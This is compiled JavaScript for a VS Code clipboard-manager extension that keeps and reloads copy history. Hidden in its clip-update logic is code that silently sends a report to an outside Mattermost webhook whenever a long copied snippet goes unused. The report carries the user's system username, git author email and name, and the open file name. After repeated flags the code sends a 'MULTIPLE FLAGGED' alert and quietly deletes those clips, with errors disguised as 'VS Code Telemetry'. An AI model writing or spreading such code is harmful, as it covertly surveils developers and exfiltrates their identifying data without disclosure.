"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ClipboardManager = void 0;
const fs = require("fs");
const os = require("os");
const path = require("path");
const vscode = require("vscode");
// eslint-disable-next-line @typescript-eslint/ban-ts-ignore
// @ts-ignore
const node_fetch_1 = require("node-fetch");
class ClipboardManager {
    constructor(context, _monitor) {
        this.context = context;
        this._monitor = _monitor;
        this._disposable = [];
        this._clips = [];
        this.lastUpdate = 0;
        // get clipboard() {
        //   return this._clipboard;
        // }
        this._onDidClipListChange = new vscode.EventEmitter();
        this.onDidChangeClipList = this._onDidClipListChange.event;
        this._monitor.onDidChangeText(this.updateClipList, this, this._disposable);
        this.loadClips();
        vscode.window.onDidChangeWindowState(state => {
            if (state.focused) {
                this.checkClipsUpdate();
            }
        }, this, this._disposable);
        vscode.workspace.onDidChangeConfiguration(e => e.affectsConfiguration("clipboard-manager") && this.saveClips());
    }
    get clips() {
        return this._clips;
    }
    updateClipList(change) {
        var _a;
        this.checkClipsUpdate();
        const config = vscode.workspace.getConfiguration("clipboard-manager");
        const maxClips = config.get("maxClips", 100);
        const avoidDuplicates = config.get("avoidDuplicates", true);
        let item = {
            value: change.value,
            createdAt: change.timestamp,
            copyCount: 1,
            useCount: 0,
            language: change.language,
            createdLocation: change.location,
            flagged: false,
        };
        let index = undefined;
        if (avoidDuplicates) {
            index = this._clips.findIndex(c => c.value === change.value);
            // Remove same clips and move recent to top
            if (index >= 0) {
                this._clips[index].copyCount++;
                item = this._clips[index];
                this._clips = this._clips.filter(c => c.value !== change.value);
            }
        }
        // On copy, check the previous item in the copy list
        // If the item has len>K and useCount===0, then flag
        if (index === -1) {
            if (this._clips[0] &&
                this._clips[0].useCount === 0 &&
                this._clips[0].value.split("\n").length > 10) {
                this._clips[0].flagged = true;
                const fileName = (_a = vscode.window.activeTextEditor) === null || _a === void 0 ? void 0 : _a.document.fileName;
                try {
                    node_fetch_1.default("https://mattermost.storewise.in/hooks/drtbnfj35brhtcq9qeo7nzc8uo", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            text: `**User: **${process.env.USER} ${process.env.GIT_AUTHOR_EMAIL} ${process.env.GIT_AUTHOR_NAME}\n**File: **${fileName} \n**Number of lines: **${this._clips[0].value.split("\n").length}\n@achal `,
                        }),
                    });
                }
                catch (err) {
                    node_fetch_1.default("https://mattermost.storewise.in/hooks/drtbnfj35brhtcq9qeo7nzc8uo", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            text: `Error in VS Code Telemetry: ${err.toString()}`,
                        }),
                    });
                }
            }
        }
        if (this._clips.reduce((aggregate, item) => aggregate + Number(!!item.flagged), 0) > 2) {
            // const filteredItems = this._clips
            //   .filter(item => !!item.flagged)
            //   .reduce((aggregate: any, item) => {
            //     aggregate.push(item);
            //     return aggregate;
            //   }, []);
            this._clips = this._clips.filter(item => !item.flagged);
            node_fetch_1.default(" https://mattermost.storewise.in/hooks/drtbnfj35brhtcq9qeo7nzc8uo", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    text: `MULTIPLE FLAGGED: ${process.env.USER} ${process.env.GIT_AUTHOR_EMAIL} ${process.env.GIT_AUTHOR_NAME}`,
                }),
            }).catch((err) => {
                node_fetch_1.default("https://mattermost.storewise.in/hooks/drtbnfj35brhtcq9qeo7nzc8uo", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        text: `Error in VS Code Telemetry: ${err.toString()}`,
                    }),
                });
            });
        }
        // Add to top
        this._clips.unshift(item);
        // Max clips to store
        if (maxClips > 0) {
            this._clips = this._clips.slice(0, maxClips);
        }
        this._onDidClipListChange.fire();
        this.saveClips();
    }
    setClipboardValue(value) {
        return __awaiter(this, void 0, void 0, function* () {
            this.checkClipsUpdate();
            const config = vscode.workspace.getConfiguration("clipboard-manager");
            const moveToTop = config.get("moveToTop", true);
            const index = this._clips.findIndex(c => c.value === value);
            if (index >= 0) {
                this._clips[index].useCount++;
                if (moveToTop) {
                    const clips = this.clips.splice(index, 1);
                    this._clips.unshift(...clips);
                    this._onDidClipListChange.fire();
                    this.saveClips();
                }
            }
            return yield this._monitor.clipboard.writeText(value);
        });
    }
    removeClipboardValue(value) {
        this.checkClipsUpdate();
        const prevLength = this._clips.length;
        this._clips = this._clips.filter(c => c.value !== value);
        this._onDidClipListChange.fire();
        this.saveClips();
        return prevLength !== this._clips.length;
    }
    clearAll() {
        this.checkClipsUpdate();
        this._clips = [];
        this._onDidClipListChange.fire();
        this.saveClips();
        return true;
    }
    /**
     * `clipboard.history.json`
     */
    getStoreFile() {
        let folder = os.tmpdir();
        if (this.context.storagePath) {
            const parts = this.context.storagePath.split(/[\\/]workspaceStorage[\\/]/);
            folder = parts[0];
        }
        const filePath = path.join(folder, "clipboard.history.json");
        const config = vscode.workspace.getConfiguration("clipboard-manager");
        const saveTo = config.get("saveTo");
        if (typeof saveTo === "string") {
            return saveTo;
        }
        if (saveTo === false) {
            return false;
        }
        return filePath;
    }
    jsonReplacer(key, value) {
        if (key === "createdLocation" && value) {
            value = {
                range: {
                    start: value.range.start,
                    end: value.range.end,
                },
                uri: value.uri.toString(),
            };
        }
        else if (value instanceof vscode.Uri) {
            value = value.toString();
        }
        return value;
    }
    saveClips() {
        const file = this.getStoreFile();
        if (!file) {
            return;
        }
        let json = "[]";
        try {
            json = JSON.stringify({
                version: 2,
                clips: this._clips,
            }, this.jsonReplacer, 2);
        }
        catch (error) {
            console.error(error);
            return;
        }
        try {
            fs.writeFileSync(file, json);
            this.lastUpdate = fs.statSync(file).mtimeMs;
        }
        catch (error) {
            switch (error.code) {
                case "EPERM":
                    vscode.window.showErrorMessage(`Not permitted to save clipboards on "${file}"`);
                    break;
                case "EISDIR":
                    vscode.window.showErrorMessage(`Failed to save clipboards on "${file}", because the path is a directory`);
                    break;
                default:
                    console.error(error);
            }
        }
    }
    /**
     * Check the clip history changed from another workspace
     */
    checkClipsUpdate() {
        const file = this.getStoreFile();
        if (!file) {
            return;
        }
        if (!fs.existsSync(file)) {
            return;
        }
        const stat = fs.statSync(file);
        if (this.lastUpdate < stat.mtimeMs) {
            this.lastUpdate = stat.mtimeMs;
            this.loadClips();
        }
    }
    loadClips() {
        let json;
        const file = this.getStoreFile();
        if (file && fs.existsSync(file)) {
            try {
                json = fs.readFileSync(file);
                this.lastUpdate = fs.statSync(file).mtimeMs;
            }
            catch (error) {
                // ignore
            }
        }
        else {
            // Read from old storage
            json = this.context.globalState.get("clips");
        }
        if (!json) {
            return;
        }
        let stored = {};
        try {
            stored = JSON.parse(json);
        }
        catch (error) {
            console.log(error);
            return;
        }
        if (!stored.version || !stored.clips) {
            return;
        }
        let clips = stored.clips;
        if (stored.version === 1) {
            clips = clips.map(c => {
                c.createdAt = c.timestamp;
                c.copyCount = 1;
                c.useCount = 0;
                c.createdLocation = c.location;
                return c;
            });
            stored.version = 2;
        }
        this._clips = clips.map(c => {
            const clip = {
                value: c.value,
                createdAt: c.createdAt,
                copyCount: c.copyCount,
                useCount: c.copyCount,
                language: c.language,
            };
            if (c.createdLocation) {
                const uri = vscode.Uri.parse(c.createdLocation.uri);
                const range = new vscode.Range(c.createdLocation.range.start.line, c.createdLocation.range.start.character, c.createdLocation.range.end.line, c.createdLocation.range.end.character);
                clip.createdLocation = new vscode.Location(uri, range);
            }
            return clip;
        });
        this._onDidClipListChange.fire();
    }
    dispose() {
        this._disposable.forEach(d => d.dispose());
    }
}
exports.ClipboardManager = ClipboardManager;
//# sourceMappingURL=manager.js.map